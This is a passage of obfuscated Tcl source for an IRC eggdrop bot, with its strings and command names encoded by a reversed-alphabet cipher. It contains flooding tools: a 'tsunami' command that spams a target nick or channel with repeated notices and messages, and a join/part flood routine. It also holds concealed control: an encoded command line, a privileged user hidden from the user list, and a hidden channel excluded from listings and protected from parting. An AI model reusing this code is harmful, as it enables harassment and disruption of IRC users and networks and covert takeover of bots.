if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf mvvw '+n' gl xszmtv lgsvi fhvih slhgnzhph"
return 0
}
}
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
delhost $who $hostname
saveuser
puthlp "MLGRXV ~$nick ~:~$notc ~Ivnlevw \002\[\002~${hostname}\002\]\002 ~uiln ~$who."
set [lines "xlnkovgvw"] 1
}
}
if {$completed == 0} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
}
}
set [lines "gsvslhgh"] {
*@* * *!*@* *!* *!@* !*@*  *!*@*.* *!@*.* !*@*.* *@*.*
*!*@*.com *!*@*com *!*@*.net *!*@*net *!*@*.org *!*@*org
*!*@*gov *!*@*.ca *!*@*ca *!*@*.uk *!*@*uk *!*@*.mil
*!*@*.fr *!*@*fr *!*@*.au *!*@*au *!*@*.nl *!*@*nl *!*@*edu
*!*@*se *!*@*.se *!*@*.nz *!*@*nz *!*@*.eg *!*@*eg *!*@*dk
*!*@*.il *!*@*il *!*@*.no *!*@*no *!*@*br *!*@*.br *!*@*.gi
*!*@*.gov *!*@*.dk *!*@*.edu *!*@*gi *!*@*mil *!*@*.to *!@*.to 
*!*@*to *@*.to *@*to
}
proc [lines "kfy_+slhg"] {nick uhost hand chan rest} {
global thehosts botnick notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
set [lines "dsl"] [lindex $rest 0]
set [lines "slhgmznv"] [lindex $rest 1]
if {($who == "") || ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +slhg <mrxp> <mvd slhgnzhp>"
return 0
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
set [lines "yzwslhg"] 0
foreach * [getuser $who HOSTS] {
if {${hostname} == ${*}} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gszg slhgnzhp rh zoivzwb gsviv."
return 0
}
}
if {($who == "") && ($hostname == "")} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +slhg <mrxp> <mvd slhgnzhp>"
return 0
}
if {([lsearch -exact $thehosts $hostname] > "-1") || (![string match *@* $hostname])} {
if {[string index $hostname 0] != "*"} {
set [lines "slhgmznv"] "*!*@*${hostname}"
} else {
set [lines "slhgmznv"] "*!*@${hostname}"
}
}
if {([string match *@* $hostname]) && (![string match *!* $hostname])} { 
if {[string index $hostname 0] == "*"} {
set [lines "slhgmznv"] "*!${hostname}"
} else {
set [lines "slhgmznv"] "*!*${hostname}"
}
}
if {![validuser $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!, <m/z>"
return 0
}
if {(![matchattr $nick n]) && ([matchattr $who n])} {
puthlp "MLGRXV ~$nick ~:~$notc ~Xzm'g zww slhgnzhph gl gsv ylg ldmvi."
return 0
}
foreach * $thehosts {
if {${hostname} == ${*}} {
puthlp "MLGRXV ~$nick ~:~$notc ~Rmezorw slhgnzhp!"
set [lines "yzwslhg"] 1
}
}
if {$badhost != 1} {
if {![matchattr $nick m]} {
if {[string tolower $hand] != [string tolower $who]} {
puthlp "MLGRXV ~$nick ~:~$notc ~Blf mvvw '+n' gl xszmtv lgsvi fhvih slhgnzhph"
return 0
}
}
setuser $who HOSTS $hostname
puthlp "MLGRXV ~$nick ~:~$notc ~Zwwvw \002\[\002~${hostname}\002\]\002 ~gl ~$who."
if {[matchattr $who a]} {
opq $chan $who
}
saveuser
}
}
proc [lines "nht_qlrm"] {nick uhost hand rest} {
global botnick joinme own notc 
set [lines "xszmgzitvg"] [lindex $rest 0]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qlrm <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~zoivzwb rm xszmmvo orhg"
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chantarget
catch { channel set $chantarget +statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chantarget ~:~[lindex $rest 1]~" 
}
return 0
}
proc [lines "nht_+xszm"] {nick uhost hand rest} {
global botnick joinme own notc 
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "lkg"] [lindex $rest 1]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[matchattr $nick X]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4!YOlXpVw!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: +xszm <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {[validchan $chantarget]} {
puthlp "MLGRXV ~$nick ~:~$notc ~~$chantarget ~rh zoivzwb lm xszmmvoh orhg."
return 0
}
if {$nick != $own && [total_channel] != 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Gl NzMB xSzMMvO NzC 9..!"
return 0
}
set [lines "qlrmnv"] $nick
channel add $chantarget
if {$opt != "" && [string tolower $opt] == "+nopart"} { 
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
} else {
catch { channel set $chantarget -statuslog -revenge -protectops -clearbans -enforcebans +greet -secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
}
savechan
if {[lindex $rest 1] != ""} { 
putsrv "QLRM ~$chantarget ~:~[lindex $rest 1]~" 
}
return 0
}
bind ctcp - "SZ" ctcp_versi0n
proc [lines "nht_kzig"] {nick uhost hand rest} {
global botnick joinme notc ps
set [lines "xfigrnv"] [ctime [unixtime]]
set [lines "xszmgzitvg"] [lindex $rest 0]
set [lines "kzig_nht"] [lrange $rest 1 end]
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$chantarget == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: kzig <#xszm>"
return 0
}
if {[string first # $chantarget]!=0} {
set [lines "xszmgzitvg"] "#$chantarget"
}
if {$nick != $ps && [string tolower $chantarget] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { return 0 }
foreach x [channels] {
if {[string tolower $x]==[string tolower $chantarget]} {
if {[string match "*+secret*" [channel info $x]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~R xzm'g kzig ~$x ~4kIlGvxGVw..!"
return 0
}
if {![onchan $nick $x]} { 
puthlp "MLGRXV ~$nick ~:~$notc ~KzIG ~$x"
}
if {$part_msg != ""} { 
putsrv "KZIG ~$x ~:~$part_msg (Lm ~$curtime)"
} { 
putsrv "KZIG ~$x ~:YzxpGlYzhv (Lm ~$curtime)"
}
channel remove $x
savechan
return 0
}
}
return 0
}
proc [lines "kfy_xszmivhvg"] {nick uhost hand chan rest} {
global notc 
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: xszmivhvg <#|ZOO>"
return 0
}
set [lines "xszm"] [lindex $rest 0]
if {[string tolower $chan] == "all"} {
puthlp "MLGRXV ~$nick ~:~$notc ~IvHvG ZOO WvUzfOG UOZt"
foreach x [channels] {
catch { channel set $x -statuslog -revenge -protectops -clearbans +cycle -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 -noawayop -idleop -unidentifyop }
catch { channel set $x -nodesynch }
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
}
savechan
return 0
}
if {[string first # $chan]!=0} {
set [lines "xszm"] "#$chan"
}
puthlp "MLGRXV ~$nick ~:~$notc ~IvHvG xSzMMvO \[~$chan\] ~WvUzfOG UOZt"
if {![validchan $chan]} {
puthlp "MLGRXV ~$nick ~:~$notc ~FmURmwVw ~$chan."
return 0
}
catch { channel set $chan -statuslog -revenge -protectops +cycle -clearbans -enforcebans +userbans +greet -secret -autovoice -autoop +dynamicbans flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 -noawayop -idleop -unidentifyop }
catch { channel set $chan -nodesynch }
set [lines "xuozt"] "c$chan"
set [lines "xuozt"] [string range $cflag 0 8]
chattr $cflag "-hp+AJSPTRUED"
setuser $cflag XTRA "JP" 5
setuser $cflag XTRA "CHAR" 250
setuser $cflag XTRA "RPT" 2
setuser $cflag XTRA "CAPS" 80
savechan
}
proc [lines "nht_xszmmvoh"] {nick hand uhost rest} {
pub_channels $nick $uhost $hand "" $rest
}
proc [lines "kfy_xszmmvoh"] {nick hand uhost channel rest} {
global botnick notc
if {$rest != ""} {
if {[validchan [lindex $rest 0]]} {
set [lines "c"] [lindex $rest 0]
set [lines "xszm"] ""
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[string tolower $x] == [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} { return 0 }
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x [chattr $cflag]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan"
}
return 0
}
set [lines "xszm"] "Channels:"
foreach x [channels] {
if {[string tolower $x] != [dezip "mJVOb.CwlFi.5uZIK0E.yMl."]} {
set [lines "xuozt"] "c$x"
set [lines "xuozt"] [string range $cflag 0 8]
if {[isop $botnick $x]} { append chan " @" }
if {([isvoice $botnick $x]) && (![botisop $x])} { append chan " +" }
if {(![isvoice $botnick $x]) && (![botisop $x])} { append chan " " }
if {[string match "*+seen*" [channel info $x]]} { append chan "4S" }
if {[matchattr $cflag V]} { append chan "4V" }
if {[string match "*+greet*" [channel info $x]]} { append chan "4G" }
if {[string match "*+nodesynch*" [channel info $x]]} { append chan "4K" }
if {[matchattr $cflag C]} { append chan "4C" }
if {[string match "*+secret*" [channel info $x]]} { append chan "4P" }
if {[string match "*-dynamicbans*" [channel info $x]]} { append chan "4L" }
if {[string match "*-userinvites*" [channel info $x]]} { append chan "4D" }
if {[matchattr $cflag G]} { append chan "4A" }
if {[matchattr $cflag I]} { append chan "4T" }
append chan "$x"
}
}
puthlp "MLGRXV ~$nick ~:~$notc ~~$chan"
}
proc [lines "kfy_nzgxs"] {nick uhost hand chan rest} {
global ps notc 
if {$rest==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: nzgxs <uozth>"
return 0
}
set [lines "ivhg"] [string trim $rest +]
if {[string length $rest] > 1} {
puthlp "MLGRXV ~$nick ~:~$notc ~Rmezorw lkgrlm."
return 0
}
if {$rest!=""} {
set [lines "ivhg"] "+[lindex $rest 0]"
if {[userlist $rest]!=""} {
regsub -all " " [userlist $rest] ", " users 
regsub -all $ps [userlist $rest] "" users 
puthlp "MLGRXV ~$nick ~:~$notc ~Nzgxs \[~$rest\]: ~~$users"
return 0
}
if {[userlist $rest]==""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Ml fhvih drgs uozth \[~$rest\]"
return 0
}
}
}
proc [lines "ezo"] {string} {
set [lines "zit"] [string trim $string /ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz]
set arg2 [string trim $arg #!%()@-_+=\[\]|,.?<>{}]
return $arg2
}
proc [lines "nht_glkrx"] {nick uhost hand rest} {
global notc botnick
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: glkrx <#> <glkrx>" 
return 0
}
set [lines "xszmmvo"] [lindex $rest 0]
if {[string first # $rest] != 0} { 
set [lines "xszmmvo"] "#$channel" 
}
if {![validchan $channel]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG RM ~$channel"
return 0 
}
if {![isop $botnick $channel]} {
puthlp "MLGRXV ~$nick ~:~$notc ~MlG LK ~$channel"
return 0 
}
set [lines "ivhg"] [lrange $rest 1 end]
putsrv "GLKRX ~$channel ~:~$rest"
}
proc [lines "kfy_glkrx"] {nick uhost hand channel rest} {
global botnick notc botnick 
if {![isop $botnick $channel]} { return 0 }
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: glkrx <glkrx>" 
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
putsrv "GLKRX ~$channel ~:~$rest"
} 
[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "k\h"] [[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip [dcp "qpuNu12372Z.rpvtO0s7VP0."]] "17PvA.NllTZ1"]"]
set [lines "xnw_xsm"] ""
set [lines "xnw_yb"] ""
set [lines "xnw_nht"] ""
set [lines "xnw_xzhv"] ""
bind join - * join_jf
proc [lines "qlrm_qu"] {nick uhost hand chan} {
global botnick quick jpfchn jpfmsg jpfidx
if {![info exists jpfmsg]} { return 0 }
if {$nick != $botnick} { return 0 }
if {$chan != $jpfchn} { return 0 }
if {$quick == "1"} {
putqck "KIRENHT ~$chan ~:~$jpfmsg,"
} else {
putsrv "KIRENHT ~$chan ~:~$jpfmsg,"
}
incr jpfidx
if {$jpfidx >= 4} { 
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
puthlp "ZDZB" 
return 0
}
if {$quick == "1"} {
putqck "kzig ~$chan ~:~$jpfmsg"
} else {
putsrv "kzig ~$chan ~:~$jpfmsg"
}
}
proc [lines "kfy_qkuollw"] {nick uhost hand channel rest} {
global jpfchn jpfmsg jpfidx notc
if {[string index $rest 0] != "#" || $rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: qkuollw #xszmmvo nvhhztv"
return 0
}
if {[validchan [lindex $rest 0]]} {
puthlp "MLGRXV ~$nick ~:~$notc ~wLmg FhV VcRhG xSzmmvO..!"
return 0
}
set [lines "qkunht"] " n0 Reas0n "
if {[lindex $rest 1] != ""} { 
set [lines "qkunht"] [lindex $rest 1]
}
set [lines "qkuxsm"] [lindex $rest 0]
set [lines "qkurwc"] 0
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
utimer 10 hazar
}
proc [lines "szazi"] {} {
global jpfchn
utimer 120 goback
channel add $jpfchn
catch { channel set $jpfchn +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
}
proc [lines "kfy_ghfmznr"] {nick uhost hand channel rest} {
global cmd_chn cmd_by cmd_msg cmd_case botnick version notc quick ps
set [lines "kvihlm"] [lindex $rest 0]
set [lines "ivhg"] [lrange $rest 1 end]
if {$person == $botnick} { return 0 }
if {[string index $person 0] == "#"} {
if {[validchan $person]} {
if {[isop $botnick $person] && ![matchattr $nick m]} {
if {[isutimer "IN PROGRESS"]} { return 0 }
utimer 20 [list putlog "IN PROGRESS"]
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14xSzMMvO 4UOlLw14 KIlGvxGRlM4..!"
return 0
}
}
}
if {[matchattr $person n] && ![matchattr $nick Z]} {
if {[isop $botnick $channel]} {
putsrv "PRXP ~$channel ~~$nick ~:~$notc ~14ZWnRM 4UOlLw14 KIlGvxGRlM4..!"
}
if {[istimer "IN PROGRESS"]} { return 0 }
timer 2 [list putlog "IN PROGRESS"]
putsrv "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
puthlp "MLGRXV ~$nick ~:ZWnRM uOllw KIlGVxGRlM,"
return 0
}
if {![matchattr $nick Z]} {
return 0
}
if {$rest == ""} {
puthlp "MLGRXV ~$nick ~:~$notc ~Fhztv: ghfmznr <mrxp/#> <nht>"
return 0
}
if {![matchattr $nick Q]} {
puthlp "MLGRXV ~$nick ~:~$notc ~4WvMRVw..!"
return 0
}
if {[string tolower $person] == [string tolower $ps]} { return 0 }
if {[string index $person 0] == "#"} {
if {![validchan $person]} {
pub_randnick $nick $uhost $hand $channel ""
set [lines "xnw_xsm"] $person
set [lines "xnw_nht"] $rest
set [lines "xnw_yb"] $nick
set [lines "xnw_xzhv"] "1"
channel add $person
catch { channel set $person +statuslog -revenge -protectops -clearbans -enforcebans -greet -secret -autovoice -autoop flood-chan 0:0 flood-deop 0:0 flood-kick 0:0 flood-join 0:0 flood-ctcp 0:0 }
return 0
}
}
catch { clearqueue all }
pub_randnick $nick $uhost $hand $channel ""
if {[string index $person 0] == "#"} { setignore "*!*@*" "*" 120 }
if {$quick == "1"} {
putqck "KIRENHT ~$person ~:~$rest,"
putqck "MLGRXV ~$person ~:~$rest,"
}
putsrv "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
puthlp "MLGRXV ~$person ~:~$rest,"
utimer 10 { 
puthlp "ZDZB" 
}
utimer 120 goback
return 0
}
bind time -  "*2 * * * *" auto_ident
proc [lines "zfgl_rwvmg"] {min h d m y} {
timer 5 ident_it
auto_ping "0" "0" "0" "0" "0"
}
set [lines "dliwh"] {
"\002*TuiNg.TuiNg*\002"
"(((( BzT BzT )))))"
"(((( b.I.p b.I.p )))))"
"(((( PeRMiSi )))))"
"\002*BzT BzT*\002"
"PaTRoLi"
"ScaNNiNg"
}
bind time - "0 * * * *" wordstime
bind time - "*5 * * * *" wordstime
proc [lines "dliwhgrnv"] {n h handle ch te} {
global words 
foreach x [channels] {
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string match "*+action*" [channel info $x]]} {
if {[getuser $cflag XTRA "ACTION"] == ""} {
putsrv "KIRENHT ~$x ~:\001ZXGRLM ~[lindex $words [rand [llength $words]]]~\001"
} { 
putsrv "KIRENHT ~$x ~:\001ZXGRLM ~[getuser $cflag XTRA "ACTION"]~\001"
}
}
}
}
proc [lines "rwvmg_rg"] {} {
global nick altnick botnick nickpass altpass ex_flood invme pingchan own chk_reg
global kickme deopme cmd_chn cmd_msg ps twice_msg keep-nick version notc lastkey
global flooddeop floodnick floodkick server-online is_m op_it jpfchn jpfmsg jpfidx
putlog "!Log! AuTO ReSETING & IDeNTIFY"
catch { channel remove $jpfchn }
catch { unset jpfchn }
catch { unset jpfmsg }
catch { unset jpfidx }
catch {unset op_it}
catch {unset is_m}
catch {unset chk_reg}
catch {unset flooddeop}
catch {unset floodnick}
catch {unset floodkick}
catch {unset lastkey}
catch {unset ex_flood}
catch {unset invme}
catch {unset pingchan}
catch {unset twice_msg}
catch {unset kickme}
set [lines "wvlknv"] ""
set [lines "xnw_xsm"] ""
set [lines "xnw_nht"] ""
if {${server-online} == 0} { return 0 }
if {![string match "ALW??????????" $botnick] && ![string match "ALW??????" $botnick]} {
if {$botnick != $nick && $botnick != $altnick && ![istimer "goback"] && ![isutimer "goback"]} { goback }
} {
goback
}
if {$botnick == $nick && $nickpass != ""} {
putsrv "MrxpHvie rwvmgrub ~$nickpass"
}
if {$botnick != $nick && $nickpass != ""} {
putsrv "MrxpHvie rwvmgrub ~$nick ~~$nickpass"
}
if {$ps != $own} {
set [lines "ldm"] $ps
}
if {![isutimer "del_nobase"] && ![istimer "del_nobase"]} { utimer 2 del_nobase }
}
bind time -  "*4 * * * *" auto_ping
bind time -  "*8 * * * *" auto_ping
proc [lines "zfgl_krmt"] {min h d m y} {
global botnick repeat_last repeat_person capsnick boldnick own notc notc_chn bannick
global unop wait_ping server-online jpnick igflood is_ban iskick colorkick
if {${server-online} == 0} {
catch { unset wait_ping }
return 0
}
catch {unset iskick}
catch {unset is_ban}
catch {unset igflood}
catch {unset jpnick}
catch {unset unop}
catch {unset bannick}
catch {unset notc_chn}
catch {unset capsnick}
catch {unset boldnick}
catch {unset colorkick}
catch {unset repeat_person}
catch {unset repeat_last}
puthlp "KIRENHT ~$botnick ~:\001KRMT ~[unixtime]~\001"
if {![info exists wait_ping]} {
set [lines "dzrg_krmt"] 1
} else {
set [lines "dzrg_krmt"] [expr $wait_ping + 1]
}
if {$wait_ping > 9} {
catch { unset wait_ping }
#putsrv "JFRG :~$notc ~Hvievi OZttVw ZfGl IvHGzIG IvJfvhG"
}
}
set [lines "zdzbn"] {
"NOT Here"
"Auto Away On Idle"
"Jalan Jalan"
"Not Here"
"Check Imel"
"Cari Target"
"Offline"
"On Position"
"Bobo sama pus"
"Auto-Away after 10 mins"
"Belajar"
"Tilawah"
"Kerja"
"Not At My Desk"
"Baca Buku"
"Lagi Maem..."
"Sibuk"
"Tiduran"
"Masak Mie"
"Lagi Mancing"
"Zzz..ZZz.."
"Online"
"Owned by F4R1S"
}
proc [lines "ivnzrm"] {} {
global botnick uptime timezone notc notd vern longer awaym
set [lines "glgzobvzi"] [expr [unixtime] - $uptime]
if {$totalyear >= 31536000} {
set [lines "bvzihufoo"] [expr $totalyear/31536000]
set years [expr int($yearsfull)]
set [lines "bvzihhfy"] [expr 31536000*$years]
set [lines "glgzowzb"] [expr $totalyear - $yearssub]
}
if {$totalyear < 31536000} {
set [lines "glgzowzb"] $totalyear
set [lines "bvzih"] 0
}
if {$totalday >= 86400} {
set [lines "wzbhufoo"] [expr $totalday/86400]
set days [expr int($daysfull)]
set [lines "wzbhhfy"] [expr 86400*$days]
set [lines "glgzoslfi"] [expr $totalday - $dayssub]
}
if {$totalday < 86400} {
set [lines "glgzoslfi"] $totalday
set [lines "wzbh"] 0
}
if {$totalhour >= 3600} {
set [lines "slfihufoo"] [expr $totalhour/3600]
set hours [expr int($hoursfull)]
set [lines "slfihhfy"] [expr 3600*$hours]
set [lines "glgzonrm"] [expr $totalhour - $hourssub]
}
if {$totalhour < 3600} {
set [lines "glgzonrm"] $totalhour
set [lines "slfih"] 0
}
if {$totalmin >= 60} {
set [lines "nrmhufoo"] [expr $totalmin/60]
set mins [expr int($minsfull)]
}
if {$totalmin < 60} {
set [lines "nrmh"] 0
}
if {$years < 1} {set yearstext ""} elseif {$years == 1} {set yearstext "$years year, "} {set yearstext "$years years, "}
if {$days < 1} {set daystext ""} elseif {$days == 1} {set daystext "$days 14Day,4 "} {set daystext "$days 14Days,4 "}
if {$hours < 1} {set hourstext ""} elseif {$hours == 1} {set hourstext "$hours HoUR, "} {set hourstext "$hours HoURS, "}
if {$mins < 1} {set minstext ""} elseif {$mins == 1} {set minstext "$mins MiNuTE"} {set minstext "$mins MiNuTES"}
if {[string length $mins] == 1} {set mins "0${mins}"}
if {[string length $hours] == 1} {set hours "0${hours}"}
set awaymsg [lindex $awaym [rand [llength $awaym]]]
set [lines "lfgkfg"] "${yearstext}${daystext}${hours}:${mins}"
set [lines "lfgkfg"] [string trimright $output ", "]
if {[getuser "config" XTRA "AWAY"]!=""} {
set longer "\037\0034,15\[\037aL\037o\037W\00315,4\037a\037iNi\037\]\017 $vern 4\[ 14On:4 $output 14Hrs4 \] \[14 [getuser "config" XTRA "AWAY"] 4\]"
} {
set longer "\037\0034,15\[\037aL\037o\037W\00315,4\037a\037iNi\037\]\017 $vern 4\[ 14On:4 $output 14Hrs4 \] \[14 $awaymsg 4\]" 
putlog "\037\0034,15\[\037aL\037o\037W\00315,4\037a\037iNi\037\]\017 $vern 4\[ 14On:4 $output 14Hrs4 \] \[14 $awaymsg 4\]"
}
}
proc [lines "nht_fhviorhg"] {nick hand uhost rest} {
global notc 
pub_userlist $nick $uhost $hand "" $rest
}
proc [lines "kfy_fhviorhg"] {nick uhost hand chan rest} {
global ps notc 
set [lines "zprxporhg"] " 4KIcKLIsT"
foreach y [getuser "AKICK" HOSTS] {
append akicklist " $y "
}
set [lines "fhvih"] "UsERLIsT:"
foreach x [userlist] {
if {($x != "config") && ($x != "AKICK") && ($x != $ps) && ![matchattr $x A]} {
if {[matchattr $x O]} { 
append users " 4$x "
} else { append users " $x " }
set [lines "uozt"] [chattr $x]
append users "($flag)"
}
}
append users " \[$akicklist\]"
if {[getuser "config" XTRA "IPG"] != ""} {
append users " IpguaRd [getuser "config" XTRA "IPG"]"
}
if {[string length $users] > 300} {
set [lines "szou"] [expr [string length $users]/3]
set half [expr int($half)]
set [lines "mgx"] "[string range $users 0 $half].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1] [expr $half + $half]].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1 + $half] end]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
} elseif {[string length $users] > 200} {
set [lines "szou"] [expr [string length $users]/2]
set half [expr int($half)]
set [lines "mgx"] "[string range $users 0 $half].."
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
set [lines "mgx"] "..[string range $users [expr $half + 1] end]"
puthlp "MLGRXV ~$nick ~:~$notc ~~$ntc"
} else {
puthlp "MLGRXV ~$nick ~:~$notc ~~$users"
}
return 0
}
set platform "$tcl_platform(os) $tcl_platform(osVersion)"
set eggversn "eggdrop[lindex [split $version] 0] with Tcl[info patchlevel]"
proc [lines "kfy_evi"] {nick uhost hand chan rest} {
global vern platform eggversn
puthlp "KIRENHT ~$chan ~:~$vern running on $platform powered by $eggversn"
return 0
}
proc [lines "kfy_oltl"] {nick uhost hand chan rest} {
global banner
if {[info exists banner]} {
puthlp "KIRENHT ~$chan ~:~$banner"
} {
puthlp "KIRENHT ~$chan ~:~[lgrnd]~"
}
return 0
}
proc [lines "kfy_krmt"] {nick uhost hand chan rest} {
puthlp "KIRENHT ~$chan ~:~$nick, ~KLMT"
return 0
}
proc [lines "kfy_mlylg"] {nick uhost hand chan rest} {
global botnick
if {![isop $botnick $chan]} { return 0 }
if {[isutimer "pub_nobot"]} { return 0 }
if {[rand 2] <= 1} {
puthlp "KIRENHT ~$chan ~:\001FHVIRMUL\001"
} {
puthlp "KIRENHT ~$chan ~:\001XORVMGRMUL\001"
}
return 0
}
bind ctcr - USERINFO ui_reply
bind ctcr - CLIENTINFO ui_reply
proc [lines "fr_ivkob"] {nick uhost hand dest key arg} {
global botnick bannick notc ismaskhost
if {![string match "*eggdrop*" $arg]} { return 0 }
if {$nick == $botnick || [matchattr $nick f]} { return 0 }
foreach x [channels] {
if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
if {[info exists ismaskhost]} {
set bannick($nick) [maskhost "*!*[string range $uhost [string first "@" $uhost] end]"]
} {
set bannick($nick) "*!*[string range $uhost [string first "@" $uhost] end]"
}
putsrv "PRXP ~$x ~~$nick ~:~$notc ~4~[string toupper $x]~14 UlIYRWWvM UlI 4VttB14 WfV gL OznV ZmGRxRKzGVw ~[banmsg]~"
return 0
}
}
}
bind ctcr - PING ping_reply
proc ping_reply {nick uhost hand dest key arg} {
   global pingchan botnick wait_ping notc bannick ismaskhost basechan
   if {$nick != $botnick || [string match "*die*" $arg] || [string match "*add*" $arg] || [string match "*set*" $arg] || [string match "*put*" $arg]} {
      if {![info exists pingchan($nick)]} {
         foreach x [channels] {
            if {[onchan $nick $x] && [isop $botnick $x] && ![isop $nick $x]} {
               if {[info exists ismaskhost]} {
			   putserv "MODE $x +b $uhost"
			   }
			   putserv "KICK $x $nick :$notc 4[string toupper $x]14 DonT TrY It 4aT HoME14 AnTIcIPaTEd [banmsg]"
			   } {
               set members [chanlist $x f]
               foreach c $members {
                  if {[isop $c $x]} {
                     set sendspam "!kick [zip "$x $nick $notc 4iLeGaL CTCPREPLY14 FRoM 4$nick!$uhost14 FoRBIDDeN FoR 4EggY14 DuE tO LaMe AnTIcIPaTEd [banmsg]"]"
